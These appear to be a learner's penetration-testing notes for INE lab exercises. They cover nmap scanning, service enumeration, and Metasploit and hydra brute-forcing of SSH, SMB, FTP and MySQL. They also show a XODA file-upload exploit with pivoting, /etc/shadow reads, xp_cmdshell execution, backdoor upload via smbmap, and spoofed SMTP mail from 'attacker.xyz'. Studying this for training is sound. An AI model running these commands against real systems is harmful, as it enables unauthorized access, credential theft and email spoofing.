    set RHOSTS demo.ine.local
    set USERNAME root
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    set VERBOSE false
    run
    
    use auxiliary/admin/mysql/mysql_enum
    set USERNAME root
    set PASSWORD twinkle
    set RHOSTS demo.ine.local
    run
    
    use auxiliary/admin/mysql/mysql_sql
    set USERNAME root
    set PASSWORD twinkle
    set RHOSTS demo.ine.local
    run
    
    use auxiliary/scanner/mysql/mysql_file_enum
    set USERNAME root
    set PASSWORD twinkle
    set RHOSTS demo.ine.local
    set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
    set VERBOSE true
    run
    
    use auxiliary/scanner/mysql/mysql_hashdump
    set USERNAME root
    set PASSWORD twinkle
    set RHOSTS demo.ine.local
    run
    
    use auxiliary/scanner/mysql/mysql_schemadump
    set USERNAME root
    set PASSWORD twinkle
    set RHOSTS demo.ine.local
    run
    
    use auxiliary/scanner/mysql/mysql_writable_dirs
    set RHOSTS demo.ine.local
    set USERNAME root
    set PASSWORD twinkle
    set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
    run
    
    ```
    
- **SSH Login**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running an SSH service will be accessible at **demo.ine.local**.
    
    **Objective:** Your task is to run the following auxiliary modules against the target:
    
    - auxiliary/scanner/ssh/ssh_version
    - auxiliary/scanner/ssh/ssh_login
    
    The following username and password dictionary will be useful: - /usr/share/metasploit-framework/data/wordlists/common_users.txt - /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
    
    Tools: Nmap , Metasploit Framework
    
    ```bash
    ping -c 4 demo.ine.local
    nmap -sS -sV demo.ine.local
    
    msfconsole
    use auxiliary/scanner/ssh/ssh_version
    set RHOSTS demo.ine.local
    exploit
    
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS demo.ine.local
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
    set STOP_ON_SUCCESS true
    set VERBOSE true
    exploit
    
    sessions
    sessions -i 1
    
    or 
    /bin/bash -i
    find / -name "flag"
    cat /flag
    
    ```
    
- **Postfix Recon:Basics (SMTP Enumeration)**
    
     SMTP (Simple Mail Transfer Protocol) 
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
    
    **Objective:** Answer the following questions:
    
    1. What is the SMTP server name and banner.
    2. Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
    3. Does user “admin” exist on the server machine? Connect to SMTP service using netcat and check manually.
    4. Does user “commander” exist on the server machine? Connect to SMTP service using netcat and check manually.
    5. What commands can be used to check the supported commands/capabilities? Connect to SMTP service using telnet and check.
    6. How many of the common usernames present in the dictionary /usr/share/commix/src/txt/usernames.txt exist on the server. Use smtp-user-enum tool for this task.
    7. How many common usernames present in the dictionary /usr/share/metasploit-framework/data/wordlists/unix_users.txt exist on the server. Use suitable metasploit module for this task.
    8. Connect to SMTP service using telnet and send a fake mail to root user.
    9. Send a fake mail to root user using sendemail command.
    
    Tools: Nmap , telnet , nc , Metasploit Framework
    
    ```bash
    What is the SMTP server name and banner.
    ans: Server: Postfix
    Banner: openmailbox.xyz ESMTP Postfix: Welcome to our mail server.
    
    nmap -sV -script banner demo.ine.local
    
    Q. Connect to SMTP service using netcat and retrieve the hostname of the server (domain name).
    ans:openmailbox.xyz
    
    nc demo.ine.local 25
    
    telnet demo.ine.local 25
    HELO attacker.xyz
    EHLO attacker.xyz
    smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t demo.ine.local
    
    msfconsole -q
    use auxiliary/scanner/smtp/smtp_enum
    set RHOSTS demo.ine.local
    exploit
    
    telnet demo.ine.local 25
    HELO attacker.xyz
    mail from: admin@attacker.xyz
    rcpt to:root@openmailbox.xyz
    data
    Subject: Hi Root
    Hello,
    This is a fake mail sent using telnet command.
    From,
    Admin
    .
    
    sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no
    
    ```
    
- **CTF 1**
    
    A Linux machine is accessible at **target.ine.local**. Identify the services running on the machine and capture the flags. The flag is an md5 hash format.
    
    - **Flag 1:** There is a samba share that allows anonymous access. Wonder what's in there!
    - **Flag 2:** One of the samba users have a bad password. Their private share with the same name as their username is at risk!
    - **Flag 3:** Follow the hint given in the previous flag to uncover this one.
    - **Flag 4:** This is a warning meant to deter unauthorized users from logging in.
    
    **Note:** The wordlists located in the following directory will be useful:
    
    - /root/Desktop/wordlists
    
    **Tools: Nmap , Metasploit, Hydra, enum4linux, smbclinet, smbmap**
    
    ```bash
    **//flag1**
    enum4linux -a target.ine.local
    nano shares.sh
    ```
    
    ```bash
    #!/bin/bash
    
    # Define the target and wordlist location
    TARGET="target.ine.local"
    WORDLIST="/root/Desktop/wordlists/shares.txt"
    
    # Check if the wordlist file exists
    if [ ! -f "$WORDLIST" ]; then
        echo "Wordlist not found: $WORDLIST"
        exit 1
    fi
    
    # Loop through each share in the wordlist
    while read -r SHARE; do
        echo "Testing share: $SHARE"
        smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
    
        if [ $? -eq 0 ]; then
            echo "[+] Anonymous access allowed for: $SHARE"
        else
            echo "[-] Access denied for: $SHARE"
        fi
    done < "$WORDLIST"
    ```
    
    ```bash
    
    cat shares.sh
    ls -la
    chmod +x shares.sh
    ./shares.sh
    //anonymous access allowed for : pubfiles
    **smbclient //target.ine.local/pubfiles -N**
    smb:>cat flag1.txt        //command not found
    smb:>help
    smb:>mget flag1.txt 
    smb:>yes
    
    $ls
    $cat flag1.txt          //got the flag
    
    **//flag2
    enum4linux -a target.ine.local**
    //In enum4linux, we identified a few usernames: josh, bob, nancy, and alice.
    
    msfconsole
    use auxiliary/scanner/smb/smb_login
    set rhosts target.ine.local
    nano users.txt
    //josh, bob, nancy, and alice
    set USER_FILE users.txt
    set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
    run
    
    //find the credentials
    $smbclient //target.ine.local/josh -U josh
    smb:>get flag2.txt
    $ls
    $cat flag2.txt
    
    **//flag3//**
    cat flag2.txt  //previous
    //FTP service is running ..it is a hint
    
    nmap target.ine.local -p- -sC -sV
    ftp -p target.ine.local 5554
    //need password
    
    hydra -L users.txt -P /root/Desktop/wordlists/unix_passwords.txt ftp://target.ine.local:5554
    //usernames : ashley , alice , amanda in users.txt
    //got the credentials :: alice : pretty
    
    ftp -p target.ine.local 5554
    username: alice
     password: pretty
     ftp>ls
     ftp>get flag3.txt
     $cat flag3.txt
     //got the flag
     
     **//flag4**
    
    //**ssh** is running
    
    ssh target.ine.local
    yes
    //got the flag4
    
    ```
    
- **INE Labs1**
    
    **windows recon: Nmap host discovery**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at demo.ine.local.
    
    **Objective:** Your task is to discover available live hosts and their open ports using Nmap and identify the running services and applications.
    
    Tools: Nmap
    
    ```bash
    ping -c 5 demo.ine.local       //ping the target machine to see if it's alive or not
    nmap demo.ine.local
    nmap -Pn demo.ine.local
    nmap -Pn -p 443 demo.ine.local     //check for close port
    
    //We can observe in the Nmap output that the host is up, but port 443 is filtered
    
    nmap -Pn -sV -p 80 demo.ine.local
    
    ```
    
    In this lab, we saw a standard method to discover hosts using Nmap, which is behind a firewall.
    
- **INE Labs2**
    
    **Importing Nmap Scan Results into MSF**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machines will be accessible at **demo.ine.local** running a vulnerable RDP service.
    
    **Objective:** To import Nmap scan results into MSF.
    
    **Tools: Nmap, msfconsole**
    
    ```bash
    ping -c 4 demo.ine.local
    nmap -sV -Pn -oX myscan.xml demo.ine.local
    service postgresql start
    msfconsole
    db_status
    db_import myscan.xml
    hosts
    services
    ```
    
    This lab demonstrates the process of importing Nmap scan results into the Metasploit Framework, enabling efficient integration of network discovery and vulnerability exploitation.
    
- **INE Lab3**
    
    **Network Service Scanning**
    
    In this lab, we are given access to a Kali machine. There are two target machines, one on the same network i.e. **demo1.ine.local**. This target machine is vulnerable and can be exploited using the following information. Use this information to retrieve services running on the second target machine and complete the mission!
    
    **Vulnerability Information**
    
    **Vulnerability:** XODA File Upload Vulnerability
    
    **Metasploit module:** exploit/unix/webapp/xoda_file_upload
    
    **Objective:** - Identify the ports open on the second target machine using appropriate Metasploit modules. - Write a bash script to scan the ports of the second target machine. - Upload the nmap static binary to the target machine and identify the services running on the second target machine.
    
    **Tools: Metasploit, Bash, Terminal, Nmap**
    
    ```bash
    ping -c 4 demo1.ine.local
    nmap demo1.ine.local
    curl demo1.ine.local
    msfconsole
    ```
    
    msf6:
    
    ```bash
    use exploit/unix/webapp/xoda_file_upload
    set RHOSTS demo1.ine.local
    set TARGETURI /
    set LHOST 192.63.4.2
    exploit
    ```
    
    **A meterpreter session is spawned on the target machine.**
    
    meterpreter
    
    ```bash
    shell
    ip addr
    exit
    //meterpreter
    
    run autoroute -s 192.112.218.2       //eth1
    ```
    
    Background the current meterpreter session and use the portscan tcp module of Metasploit to scan the second target machine.
    
    Press CTRL+z and Enter y to background the meterpreter session.
    
    ```bash
    use auxiliary/scanner/portscan/tcp
    
    **set RHOSTS 192.112.218.3**
    
    set verbose false
    set ports 1-1000
    exploit
    ```
    
    Check the static binaries available in the "/usr/bin/" directory.
    
    root@INE:
    
    ```bash
    ls -al /root/static-binaries/nmap
    file /root/static-binaries/nmap
    ```
    
    Press CTRL+z to background the Metasploit session.
    
    Using the script provided at [[https://catonmat.net/tcp-port-scanner-in-bash](https://catonmat.net/tcp-port-scanner-in-bash)] as a reference, create a bash script to scan the first 1000 ports
    
    ```bash
    #!/bin/bash
    for port in {1..1000}; do
     timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
    done
    ```
    
    Save the script as [bash-port-scanner.sh](http://bash-port-scanner.sh/)
    
    Foreground the Metasploit session and switch to the meterpreter session.
    
    Press "fg" and press enter to foreground the Metasploit session.
    
    ```bash
    sessions -i 1
    ```
    
    meterpreter
    
    ```bash
    upload /root/static-binaries/nmap /tmp/nmap
    upload /root/bash_port_scanner.sh /tmp/bash_port_scanner.sh
    ```
    
    Make the binary and script executable and use the bash script to scan the second target machine.
    
    ```bash
    shell
    cd /tmp/
    chmod +x ./nmap ./bash_port_scanner.sh
    ./bash_port_scanner.sh **192.112.218.3**
    ```
    
    Three ports are open on the target machine, ports 21, 22 and 80.
    
    The services running on the target machine are FTP, SSH and HTTP.
    
    ```bash
    ./nmap -p- **192.112.218.3
    
    //result
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http**
    
    ```
    

### **Collected Script**

```
#### **FTP Enumeration**
1. `ftp_version` : to check FTP version
2. `ftp_login` : to BF login credentials
	-> user : */usr/share/metasploit-framework/data/wordlists/common_users.txt*
	-> pass : */usr/share/metasploit-framework/data/wordlists/unix_passwords.txt*

	NOTE : BF can cause a DOS attack on target and make it down.

3. `anonymous` : this module helps to check whether we can login it as anonymous user or NOT.

4. nmap script to Brute Force :
	-> `echo 'sysadmin' > users`
	-> `nmap -p 21 --script=ftp-brute 192.237.183.3 --script-args userdb=./users`

----
**#### SMB Enumeration**
1. `smb_veriosn` : used to find SMB service version
2. `smb_enumusers` : enumerate users on SMB port
3. `smb_enumshares` : enumerate shares
4. `smb_login` : BF the login creds

-> `smbclient -L \\\\IP\\ -U user` : get into the SMB
-> `smbclient \\\\IP\\SHARE -U user` : get into a particular share

**###### scripts & tools**
-> `--script=smb-os-discovery` : get you the adject version of SMB service.
-> `nmblookup -A demo.ine.local` : tools to play with sbm
-> `smbclient -L ////demo.ine.local -U anonymous` : anonymous login in SMB

-> `rpcclient -U "" -N demo.ine.local` : rpcclient tool to work with SMB
	-> `rpcclient $> querydominfo`

----
**#### HTTP Enumeration**
1. `http_version` : get the adject version
2. `http_header` : get the uncommon headers
3. `robots_txt` : get you the robots.txt
4. `dir_scanner` : dir enumeration module in msf
	-> /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt
5. `files_dir` : file enumeration just like dir enum
	-> /usr/share/metasploit-framework/data/wmap/wmap_files.txt
6. `http_login` : BF the creds of a HTTP website
	*user lists*
	-> /usr/share/metasploit-framework/data/http_default_users.txt
	-> /usr/share/metasploit-framework/data/wordlists/namelist.txt
	*pass lists*
	-> /usr/share/metasploit-framework/data/http_default_pass.txt
	-> /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
7. `http_userdir_enum` : get the potential usernames form apache website.

----
**#### MySQL Enumeration**
-> `search type:auxiliary name:mysql`

1. `mysql_version` : to get the version
2. `mysql_version` : perform a BF
3. `mysql_enum` : help to enumerate DB, *need USER/PASS*
4. `mysql_sql` : used to execute SQL queries on the server *need USER/PASS*
5. `mysql_schemadump` : dump all the tables of inside schema.
6. `mysql_writable_dirs` : check which directory is writable in system *need USER/PASS*
	-> /usr/share/metasploit-framework/data/wordlists/directory.txt

-> `mysql -h IP -u root -p`  : connect to the SQL DB

----
**#### SSH Enumeration**
-> `search type:auxiliary name:ssh`

1. `ssh_version` : get the adject version

-> if the target is configured to authenticate by a USER:PASS pair then use this
2. `ssh_login` : perform a BF for USER/PASS

->  if the target is configured to authenticate by a PUBKEY pair then use this
3. `ssh_login_pubkey` : perform a BF for PUBLIC KEYS.

4. `ssh_enumusers` : used to enumerate users.
	-> /usr/share/metasploit-framework/data/http_default_users.txt
	->/usr/share/metasploit-framework/data/wordlists/common_users.txt
	-> usr/share/metasploit-framework/data/wordlists/common_passwords.txt

**#### SMTP Enumeration**
-> `search type:auxiliary name:smtp`
-> Port : 25 , 465 , 587

1. `smtp_version` : get the version of SMTP -> also give email/domain of the version
2. `smtp_enum` : enumerate users , emails on the SMTP.

-> `nc demo.ine.local 25` : connect with SMTP
-> `EHLO openmailbox.xyz` : Start with SMTP (this mail comes on banner when you try to connect with `nc` or `telnet`.
-> `EHLO openmailbox.xyz` : pop up all the commands present on the server
-> `VRFY user` : replace user with actual user like admin : to check whether a user is present on the server or not !!

--> command to enumerate users
	`smtp-user-enum -t demo.ine.local -U /usr/share/commix/src/txt/usernames.txt -M VRFY`

-> Commands to send mail on the server to any user
```bash
telnet demo.ine.local 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
```

-> `sendmail` : command to send mails over SMTP though Terminal
	-> `sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no`
	-> `-f` : FROM
	-> `-t` : TO
	-> `-s` : SMTP Server (IP)
	-> `-u` : subject
	-> `-m` : message body
	-> `-o` : setting the TLS off

-----
**#### SAMBA**
-> PORT : 139/445

Plot : It usage USER/PASS Authentication in order to obtain access to the server , now we can do a Brute Force attack in order to gain access to the server.

**###### Tools :**
1. `SMBClient` :
	-> `smbclient -L IP -U USERNAME` : get the shares name.
	-> `smbclient //IP/SHARE -U USERNAME` : get the particular share data.
	-> `get FILENAME` : get download a file

2. `SMBMap` :
	->  `smbmap -H IP -u USERNAME -p PASSWORD`

3. `enum4linux` : tool used to enumerate samba server. alt of `enum.exe` : for windows
	-> `enum4linux -a -u USER -p PASSWORD IP` : to get all information about the samba server
	-> `enum4linux -a IP` : in case , if don't have USER/PASS.
	-> `enum4linux -a -u admin -p password1 demo.ine.local`

4. `hydra` : to perform BF
	-> `hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz  demo.ine.local smb`

5. `auxiliary/scanner/smb/pipe_auditor `
	-> MSF Module to file pipe

###### version 3.0.20 :: vulnerable to command injection :: MSF module :: No auth need

----
#### PHP
-> search for and `phpinfo.php` file and additional information related to PHP
-> USE _directory enumeration_ tool with `-x php`
-> Version `< 5.3.1` are vulnerable to _REMOTE CODE EXECUTION_

```

## Nmap Script Engine(NSE):

**Port Scanning and Enumeration With Nmap**

```bash
nmap -Pn IP               //-Pn remove blocking ping problm
nmap -Pn -sV IP
nmap -Pn -sV -O IP -oX windows_server_2012
cat windows_server_2012
```

**Importing Nmap Scan Results into MSF**

msfconsole :msf5

```bash
workspace
workspace -a Win2k12          / -a add name
workspace
clear
db_import /root/windows_server_2012
hosts                  //imported data successfully
services

workspace
workspace -a Nmap_MSF
workspace
db_mmap -Pn -sV -O IP            //nmap within msf
hosts
services
vulns

```

- **Port Scanning with Auxiliary Modules:**
    
    
    ```bash
    ifconfig
    service postgresql start
    msfconsole
    
    ```
    
    msf:
    
    ```bash
    workspace -a Port_Scan
    workspace
    search portscan
    //for tcp scan here 
    use 5
    clear
    ifconfig
    show options
    set rhosts ip
    show options
    run
    curl target_ip
    search xoda
    use 0
    show options
    set rhosts ip
    set TARGETURI /                / means root
    set lhost host_ip
    show options
    exploit            // get the meterpreter
    ```
    
    meterpreter:
    
    ```bash
    sysinfo
    
    shell
    /bin/bash -i
    ifconfig               eth1 diff ip
    
    //meterperter
    run autoroute -s eth1_ip
    background
    
    ```
    
    msf:
    
    ```bash
    sessions
    search portscan
    use 5
    set rhosts ip_eth0
    show options
    run
    back
    
    search udp_sweep
    use 0
    show options
    ifconfig
    set rhosts eht1--2-->3
    run
    
    ```
    

## **Service Enumeration@**

- FTP Enumeration@
    - FTP
        
        FTP (**File Transfer Protocol**) - a client-server protocol used to transfer files between a network using TCP/UDP connections.
        Default FTP port is **21**, opened when FTP is activated for sharing data.
        
        - `nmap -p21 -sV -sC -O 192.217.238.3`
        - Try Anonymous login `ftp 192.217.238.3` - failed
        - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp`- hydra brute force
        - `nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3` - nmap to brute password
        - `nmap --script ftp-anon -p21 192.119.169.3` - nmap anonymous login script
    
- SMB Enumeration
    - SMB
        
        SMB (**Server Message Block**) - a network file and resource sharing protocol, based on a client-server model. Usually SMB can be found on ports **139 or 445** 
        
        **SMB nmap scripts** 
        
        `nmap -p445 -sV -sC -O <TARGET_IP>`
        
        After finding SMB through port scanning, gather more information with nmap.
        
        - `nmap -p445 --script smb-protocols 10.2.24.25` - SMB Protocols
        - `nmap -p445 --script smb-security-mode 10.2.24.25` - SMB Security levels
        - `nmap -p445 --script smb-enum-sessions 10.2.24.25` - SMB logged in users
        - `nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - login admin default
        - `nmap -p445 --script smb-enum-shares 10.2.24.25` - SMB shares
        - `nmap -p445 --script smb-enum-users 10.2.24.25` - SMB users
        - `nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - SMB windows users
        - `nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Server statistics
        - `nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - system domains
        - `nmap -p445 --script smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Available groups
        - `nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Services
        - `nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - ls cmd
        
        **SMBMap** 
        
        - `nmap -p445 --script smb-protocols 10.2.21.233`
        - `smbmap -u guest -p "" -d . -H 10.2.21.233`
        - `smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.233` - Login
        - `smbmap -u administrator -p smbserver_771 -H 10.2.21.233 -x 'ipconfig’` - Running commands
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -L` - List all drives
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -r 'C$’` - List directory contents
        - `smbmap -u admin -p password1 -H 192.174.58.3` - SMB shares using credentials
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --upload '/root/sample_backdoor' 'C$\sample_backdoor’` - Upload file
        - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\flag.txt’` - Download a file
        
        **SMB Recon - Basics 1** 
        
        - `nmap -sV -p 139,445 192.28.157.3`
        - `nmap --script smb-os-discovery -p 445 192.28.157.3` - SMB OS detection
        
        **rpcclient** 
        
        It is a tool for executing client side MS-RPC functions
        
        - `nmap 192.230.128.3`
        - `rpcclient -U "" -N 192.230.128.3`
        - rpcclient $> `srvinfo`
        - rpcclient $> `enumdomusers` - users
        - rpcclient $> `enumdomgroups` - groups
        - rpcclient $> `lookupnames admin` - SID of user “admin” using rpcclient.
        
        **enum4linux** - tool for enumerating data from Windows and Samba hosts 
        
        - `enum4linux -o 192.230.128.3`
        - `enum4linux -U 192.230.128.3` - users
        - `enum4linux -S 192.187.39.3` - shares
        - `enum4linux -G 192.187.39.3` - domain groups
        - `enum4linux -i 192.187.39.3` - Check if samba server is configured for printing
        - `enum4linux -r -u "admin" -p "password1" 192.174.58.3` - List users SUID
        
        **Metasploit** 
        
        - `use auxiliary/scanner/smb/smb_version`
        - `use auxiliary/scanner/smb/smb_enumusers`
        - `use auxiliary/scanner/smb/smb_enumshares`
        - `use auxiliary/scanner/smb/pipe_auditor` - user cred: admin-password1
        
        **nmblookup** 
        
        NetBIOS over TCP/IP client used to lookup NetBIOS names
        
        - `nmblookup -A 192.28.157.3`
        
        **smbclient** 
        
        Ftp-like client to access SMB/CIFS resources on servers
        
        - `smbclient -L 192.28.157.3 -N`
        - `smbclient [//192.187.39.3/public](https://192.187.39.3/public) -N`
        - `smbclient -L 192.28.157.3 -U jane` - use “abc123” as password
        - `smbclient [//192.174.58.3/jane](https://192.174.58.3/jane) -U jane`
        - `smbclient [//192.174.58.3/admin](https://192.174.58.3/admin) -U admin` - use “password1” as password
        - `smb> get flag` - Important cat and type wont work in smb
        
        **Dictionary Attack** 
        
        - `nmap -Pn -sV 192.174.58.3`
        - `msfconsole`
        - `use auxiliary/scanner/smb/smb_login`
        - `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`
        - `set SMBUser jane` - Known already specified in the lab description, will not be same in the exam
        - `set RHOSTS 192.174.58.3`
        - `exploit`
        
        **Hydra** 
        
        - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.3 smb`
    
- Web Server Enumeration: http
    
    
    - HTTP
        
        HTTP (**Hyper Text Transfer Protocol**) - a client-server application layer protocol, used to load web pages using hypertext links.
        Default HTTP port is **80** and HTTPS port is **443.**
        
        - `nmap -p80 -sV -O 10.4.16.17`
        - `whatweb 10.4.16.17`
        - `http 10.4.16.17`
        - `dirb [http://10.4.16.17](http://10.4.16.17/)`
        - `browsh --startup-url [http://10.4.16.17/Default.aspx](http://10.4.16.17/Default.aspx)`
        - `nmap --script=http-enum -sV -p80 10.4.21.207` - http enum nmap script
        - `nmap -sV -p 80 10.4.21.207 -script banner`
        - `nmap --script=http-methods --script-args http-methods.url-path=/webdav/ -p80 10.4.21.207` - http methods nmap script
        - `curl 192.199.232.3 | more` - curl cmd
        - `use auxiliary/scanner/http/brute_dirs` - Directory brute-force
        - `use auxiliary/scanner/http/http_version` - http version
        
        **HTTP Login** 
        
        - `msfconsole`
        - `use auxiliary/scanner/http/http_login`
        - `set RHOSTS 192.199.232.3`
        - `set USER_FILE /tmp/users`
        - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
        - `set VERBOSE false`
        - `set AUTH_URI /dir/`
        - `exploit`
    
- MySQL Enumeration
    
    
    - MYSQL
        
        MYSQL - an open-source relational database management system, used to add, access and process data stored in a server database using the SQL (Structured Query Language) syntax. It's also included in the LAMP technology stack (Linux, Apache, MySQL, PHP) to store and retrieve data in well-known applications, websites and services.
        Default MYSQL port is **3306**
        
        - `nmap -sV -p3306 192.49.51.3`
        - `mysql -h 192.49.51.3 -u root`
        - `mysql > show databases;`
        - `mydql> select load_file(”/etc/shadow”);`
        
        **Metasploit Enum** 
        
        - `msfconsole`
        - `use auxiliary/scanner/mysql/mysql_schemadump` - schema dump
        - `set RHOSTS 192.49.51.3`
        - `set USERNAME root`
        - `set PASSWORD "”`
        - `exploit`
        
        - `use auxiliary/scanner/mysql/mysql_writable_dirs` - writable dirs
        - `set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt`
        - `set RHOSTS 192.49.51.3`
        - `set VERBOSE false`
        - `set PASSWORD "”`
        - `exploit`
        
        - `use auxiliary/scanner/mysql/mysql_file_enum`  - File enum
        - `set RHOSTS 192.49.51.3`
        - `set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt`
        - `set PASSWORD "”`
        - `exploit`
        
        - `use auxiliary/scanner/mysql/mysql_hashdump`  - hash dump
        - `set RHOSTS 192.49.51.3`
        - `set USERNAME root`
        - `set PASSWORD "”`
        - `exploit`
        
        **Nmap Scripts**
        
        - `nmap --script ms-sql-info -p1433 10.4.21.27`- Info
        - `nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27` - ntlm info
        - `nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27` - enumerate users and passwords
        - `nmap --script ms-sql-empty-password -p1433 10.4.21.27` - check empty password users
        - `nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27` - Dump MSSQL users hashes
        - `nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27` cmd shell
        - `nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" -p1433 10.4.21.27` - cmd shell
        
        **MYSQL Login**
        
        **Metasploit**
        
        - `nmap -sV -p3306 192.222.16.3`
        - `msfconsole`
        - `use auxiliary/scanner/mysql/mysql_login`
        - `set RHOSTS 192.222.16.3`
        - `set USERNAME root`
        - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
        - `set VERBOSE false`
        - `set STOP_ON_SUCCESS true`
        - `exploit`
        
        **Hydra** 
        
        - `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.222.16.3 mysql`
        
        **MSSQL Enum with Metasploit port- 1433**
        
        - `nmap --script ms-sql-info -p1433 10.4.23.176`
        - `msfconsole`
        - `use auxiliary/scanner/mssql/mssql_login`
        - `set RHOSTS 10.4.23.176`
        - `set USER_FILE /root/Desktop/wordlist/common_users.txt`
        - `set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt`
        - `set VERBOSE false`
        - `exploit`
        
        - `use auxiliary/admin/mssql/mssql_enum`
        - `set RHOSTS 10.4.23.176`
        - `exploit`
        
        - `use auxiliary/admin/mssql/mssql_enum_sql_logins`
        - `set RHOSTS 10.4.23.176`
        - `exploit`
        
        - `use auxiliary/admin/mssql/mssql_exec`
        - `set RHOSTS 10.4.23.176`
        - `set CMD whoami`
        - `exploit`
        
        - `use auxiliary/admin/mssql/mssql_enum_domain_accounts`
        - `set RHOSTS 10.4.23.176`
        - `exploit`
    
- SSH Enumeration
    
    
    - SSH
        
        SSH (**Secure Shell Protocol)** - a cryptographic network protocol for operating network services securely over an unsecured network, based on a client-server model. Default SSH TCP port is **22**.
        
        - `nmap -p22 -sV -sC -O 192.8.3.3`
        - `nc 192.8.3.3 22` - Banner grabbing
        - `ssh [root@192.8.3.3](mailto:root@192.8.3.3) 22`
        - `nmap --script ssh2-enum-algos 192.8.3.3` - nmap enum-alogo script
        - `nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.8.3.3` - nmap ssh hostkey script
        - `nmap -p22 --script ssh-auth-methods --script-args="ssh.user=student" 192.8.3.3` - nmap ssh auth method scripts
        - `ssh student@192.8.3.3`
        
        **Dictionary Attack** 
        
        - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh`
        - `nmap -p22 --script=ssh-brute --script-args userdb=/root/users 192.230.83.3`
        - Msfconsole
            - `use auxiliary/scanner/ssh/ssh_login`
            - `set RHOSTS 192.230.83.3`
            - `set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
            - `set STOP_ON_SUCCESS true`
            - `set VERBOSE true`
            - `exploit`
    
- SMTP Enumeration
    
    
    - SMTP
        
        SMTP (**Simple Mail Transfer Protocol)** - a communication protocol used for the transmission of email.
        Default SMTP TCP port is **25.**
        
        - `nmap -sV 192.63.243.3`
        - `nc 192.63.243.3 25` - banner grabbing
        - `telnet 192.63.243.3 25` - telnet
        - `smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t 192.63.243.3` - user enum
        - `use auxiliary/scanner/smtp/smtp_enum`
        - `sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.63.243.3 -u Fakemail -m "Hi root, a fake mail from admin" -o tls=no` - send fake mail
    

# **Assessment Methodologies: Vulnerability Assessment**

**Labs:**

- **Windows:IIS Server DAVTest**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
    
    **Objective:** Exploit the WebDAV service and retrieve the flag!
    
    **The following username and password may be used to access the service:**
    
    | Username | Password | | bob | password_123321 |
    
    Tools: DAVTest, Cadaver, ASP Webshell
    
    ```bash
    nmap demo.ine.local
    
    //port 80 where the IIS server is running.
    
    nmap --script http-enum -sV -p 80 demo.ine.local
    
